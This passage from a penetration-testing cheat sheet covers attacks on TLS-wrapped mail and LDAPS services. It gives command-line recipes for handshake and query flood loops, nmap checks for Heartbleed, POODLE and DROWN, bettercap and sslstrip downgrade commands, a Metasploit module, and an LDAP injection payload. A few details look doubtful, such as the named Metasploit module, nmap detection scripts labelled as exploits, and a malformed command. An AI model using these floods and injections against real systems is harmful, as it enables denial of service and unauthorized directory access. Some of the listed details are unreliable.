### SSL/TLS Handshake Flood
- **Tool:** [[OpenSSL]]
     ```bash
     while true; do openssl s_client -connect <target_ip>:587 & done
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

### LDAP Query Flood
- **Tool:** [[LDAPSearch]]
    ```bash
    while true; do ldapsearch -H ldaps://<target_ip>:636 -b "DC=mydomain,DC=com" "(uid=*)"; done
    ```
- **Description:** Floods the LDAP server with queries, consuming resources and potentially causing a denial of service.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 587 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 587 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 587 <target_ip>
	```
- **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

### SSL/TLS Downgrade Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
     ```bash
     bettercap -iface <interface> -T <target_ip> --proxy
     
     sslstrip -l 587
     ```
- **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

### LDAPS Certificate Validation Bypass
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/scanner/ldap/ldap_cert_validation_bypass
	set RHOSTS <target_ip>
	run
	```
- **Description:** Exploit a misconfigured LDAPS server that improperly validates certificates, allowing unauthorized access.

### LDAPS Injection
- **Tool:** [[Custom Scripts]]
    ```bash
    ldapsearch -H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' -b "DC=mydomain,DC=com" "(&(uid=*)(userPassword=*))"
    ```
- **Example:**
	```bash
	ldapsearch-H ldaps://<target_ip>:636 -D "CN=<username>,DC=<domainname>,DC=<top_level_domain>" -w '<password>' "(uid=$USER_INPUT)"
	```
- **Malicious Input:** This input modifies the query to return all objects, bypassing the intended filter.
	```bash
	` `*)(|(objectClass=*))` `
	```
- **Description:** Exploits poorly sanitized input in LDAP queries to extract sensitive information. By injecting malicious LDAP statements, attackers can alter the intended query logic and gain unauthorized access to directory data.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 4513 (LDAP Authentication)|https://tools.ietf.org/html/rfc4513|
|RFC 2830 (LDAP over TLS)|https://tools.ietf.org/html/rfc2830|
|OpenLDAP Admin Guide|https://www.openldap.org/doc/admin24/|
|Microsoft Active Directory LDAP|https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-ldap-over-ssl-ldaps-certificates|
|Nmap Guide|https://nmap.org/book/nmap-services.html|
|Hydra Brute Force|https://tools.kali.org/password-attacks/hydra|
|Metasploit Framework|https://www.metasploit.com|
|OpenSSL Documentation|https://www.openssl.org/docs/man1.1.1/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|